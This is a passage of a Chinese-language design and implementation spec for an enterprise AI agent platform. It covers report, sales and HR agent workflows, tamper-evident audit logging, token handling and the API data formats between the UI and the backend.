| M3 | `agents/report/`：计划（期间和语言由代码解析；没结束的期间直接拒绝）→ 五个领域并行取数（请求人身份；只用已签核的快照；看不到的明确写“无权限”）→ 写作（没有工具，`{metric:<id>}` 占位；代码替换并校验每个数字，不通过就用代码模板）→ 收尾（表头、列出所有隐藏内容的附录、再校验一次）→ 带水印导出（§13） | CEO 和 CTO 拿到的报告不同；每个数字都能追溯到 SQL；埋入的问题被发现；n<5 的分组不展示 |
| M4 销售 | `agents/sales/`：画像分支：接收（只接受 L1 的公司名）→ 隔离的 `sales_web` 子图（只有 `web.search/fetch`，不存 checkpoint，输出固定的 `CompanyProfile`；L1 时带 `public_only` 走 `external`，用户调高级别时走本地）→ 打分（以用户身份读 CRM：意向分由代码算、匹配度、分级、Playbook；L3）→ 策略（本地；只用画像里的枚举和数字字段）。跟进分支（在已有画像的会话里输入 `/followup [CT-xxxxx]`）：起草邮件（本地）→ `crm.send_email` 提议（风险档 3）→ 审批 | 注入网页不起作用；分数用历史数据回测 |
| M4 HR | `agents/hr/`：`hr_headcount`（通过 `hr.headcount_by_dept` 汇总；没有预算是 L2，有预算是 L3；模型写的说明不许有数字）。`hr_screening`：接收（读任何东西之前先升到 L3）→ 筛查（不可信 + 敏感，没有工具；去掉受保护属性；逐条硬性条件给证据和校验过的引文；L4）→ 等人决定（interrupt `hr_decision`）→ 记录。`hr_candidates`：只读，纯代码 | 反事实简历对的结果完全相同；任何地方都没有分数、排名或推荐 |

## 17. 如果真实部署

项目最后写成 `docs/real-deployment.md`：硬件选型、vLLM/SGLang 推理框架、网络隔离、Keycloak、OPA/Cedar 策略引擎、Langfuse、SLO，以及把审计锚点送到数据库主机之外、只能追加的存储上。只写文档，不实现。

---

## 实现说明（地基阶段已完成）

地基阶段（冻结的核心和 A1–A5 开发流）已经完成，英文规范也已改成和代码一致：§3–§9 和 §15 写的就是现在的实现；§10–§14、§16 仍是待建部分的规范（B1 的 `migrations/030_b1_rag.sql`、`corpai/embed/`、`corpai/rag/`，B2 的 `corpai/mcp_servers/`、`corpai/proposals/`、`migrations/060`–`062`，以及 B4 的 `ui/` 刚开始写，还没提交；`corpai/agents`、`corpai/api` 还不存在）。这里只挑出几个值得学习的实现选择，各用一句话说明为什么，再汇总留给后续阶段的事。

**值得学习的实现选择**
- **审计哈希用长度前缀格式，不用 JSON**（§9）：Python 和 SQL 两边能算出完全相同的字节，测试可以直接比对。
- **哈希链在插入前触发器里建，拿到锁之后才分配 seq，只允许 READ COMMITTED**（§9）：任何写入途径都会入链，序号顺序就是链的顺序，链也不会分叉。
- **审计锚点存在数据库之外，并用 HMAC 签名**（§9）：补上“删掉末尾几条”和“表主人整条重算哈希”这两个链本身发现不了的漏洞。
- **trace 在 span 结束时按最终级别统一脱敏**（§9）：中途升级的 span 不会留下按低级别脱敏的输入。
- **安全控制用真实时间，模拟日期只管业务数据**（§3）：一个能随手改的配置，不能决定授权和令牌什么时候过期。
- **SECURITY DEFINER 函数从事务变量取身份，同时查角色、组和 clearance**（§4）：伪造一个变量，或者用停用的账号，都过不了。
- **多一张 `core.sessions` 表，让 JWT 可以撤销**（§5）：退出登录和离职立即生效，不用等令牌自然过期。
- **每种令牌一把密钥，有效期上限在签发和校验两头都查**（§5）：一把密钥泄露只影响一种令牌，签发那边出了错也会在校验这边被拦下。
- **密钥每次使用都重新读文件**（`corpai/identity/keys.py`）：删掉某个密钥文件，这类令牌马上全部失效，是一个不用重启的紧急“全员登出”开关。
- **`can_approve` 取自报风险档和清单风险档中较高的**（§6）：报低风险档绕不过四眼审批。
- **人名词典加载要么全成功要么不变，词典为空时网关至少按 L3 处理**（§7、§8）：一份不完整的词典比直接报错更危险。
- **网关在排队之后、每次重试之前都重读开关；出口记录先写后发；预算先预留后结算，取消时在 shield 里清理**（§8）：排队期间打开的开关也能生效，每次外发都有账可查，预算既不会被并发冲破，也不会因为调用被取消而白白占着。

注意：`ChatRequest.public_only` 和 `classify_text(..., public=True)`（§7、§8，对应决定 D5：已发布页面上的商业金额保持 L1）是地基阶段修 X-01（原待决定事项 D-01）时加进网关代码的，已随地基提交入库，`tests/gateway/test_public_only.py` 有 5 个测试；英文规范这次更新才把它写进来。

**留给后续阶段的事**
- B3：API 启动（lifespan）时加载人名词典；在 `create_app()` 里挂上 OpenAI 兼容路由；基于 `ops.read_switches`/`ops.set_switch` 做出管理员开关接口（§7、§13）。
- B1：每次导入或重新生成数据后刷新人名词典（§7）。
- M4：给用人经理开放本岗位候选人的工具 `hris.list_candidates`/`get_candidate`（§6）。
- B3 或某个里程碑：在 `agents.yaml` 里加一个能用 `code.create_ticket`/`code.comment_ticket` 的工单 Agent（§6）。
- 审计与 trace：安全审计员读日志时也记一条 `audit_read` 事件；`dept_stats` 设最小分组人数；`trace.spans` 加 `subject_ids`，支持 GDPR 删除（§9）。
- 真实部署：把审计锚点送到数据库主机写不了的存储上（§17）。

---

## 18. API 数据格式（界面和后端之间的约定）

完整的 JSON 示例见英文规范 §18，这里只说要点：

- 出错时一律返回 `{"error": {"code": "...", "message": "简短，说清楚该怎么办"}}`。错误码：`unauthenticated`（401）、`forbidden`（403）、`not_found`（404）、`bad_request`（400）、`local_unavailable`、`external_unavailable`、`gateway_busy`（503）、`budget_exceeded`（429）、`secret_detected`（400）。
- `POST /api/runs` 返回 `{run_id, thread_id, app, status: done|waiting_approval|error, output: {text, citations, data}, hwm, route, events, pending_approval, error}`。没有调用模型的运行（法务“到期合同”、`hr_candidates`）`route` 为 null。
- 事件 `events` 的种类：`classify`、`retrieval`、`tool`（被拒绝的条目在 `denied` 里）、`hwm`、`route`、`approval`、`notice`（带 `code` 和中英文文案；`embedded_instruction` 还带 `source`，说明是哪份资料里写了给 AI 的指令）。
- 问答每次运行只有**一个** `route` 事件：回答那次调用的线路，也就是 `run.route`。高水位只升不降，所以这是本次运行最严格的线路；工具轮次照样审计和追踪。`output.data.flagged_sources` 列出被扣下的资料。
- 各应用 `output.data` 的格式：法务有 `mode`（review、due、draft、send、invalid），拒绝时放 `data.error {code, message}`，运行状态仍是 done；报告有 `sections`、`table`（每个数字带来源：指标 id、SQL 哈希、公式、签核人、版本）、`export` 等；销售画像有 `web`（线路、级别、`public_only`、被标记的网页）、`fit`、`intent`、`playbook`、`steps`；HR 筛查有逐条证据 `items`、`protected_removed`、`awaiting_decision`，没有分数；候选人有按岗位分组的 `requisitions` 和 `denied`。
- 审批：`POST /api/proposals/{id}/approve` 带 `{params_hash, reason}`，返回 `{proposal, run}`（run 是恢复后的那次运行）。
- `GET /api/audit` 只有安全审计员能用，每次调用都写一条 `audit_read`。

---

## 实现说明（接线阶段，2026-10-07 晚）

M1–M4 的图、路由和页面在这一阶段接上了平台服务。值得学习的几处：

- **一个应用一组文件**：每个里程碑只改自己的 `view_<x>.js`、`i18n_<x>.js`、`demo_<x>.js`、`fixtures/<x>.js`，共用的路由、首页、演示后端不动。并行开发时互相踩不到，静态测试保证文案键不重复、中英文一致。
- **演示模式也走同一套检查**：不管哪个里程碑提供的录制，都要经过共用的启动检查、会话级别、用户级别和宕机开关，演示和真实服务器的行为才不会各说各话（BR-04/BR-05 的教训）。
- **用户调高的级别是下限，子 Agent 也不例外**：W-M1 的路由样例测试发现销售联网子 Agent 和 HR 的三张图都没用上 `ctx.user_level`，用户把会话标成机密后，部分调用照样走外部。集成时全部改掉，相关的“已知缺口”标记也删掉了。
- **单一的人数实现**：编制人数只剩 `hr.headcount_by_dept` 一个 SQL 函数，“少于 5 人不展示”在 SQL 里就做掉，Python 拿不到小组的真实人数。
- **根目录的 conftest**：`evals/` 和 `tests/` 共用同一套夹具和同一个数据库，不管目录顺序。只有 `CORPAI_LLM=live` 而且命令行只写了 `evals/` 下的路径时，才会真的调用模型。

仍待处理的事见 `docs/issues-log.md` 第十三节。
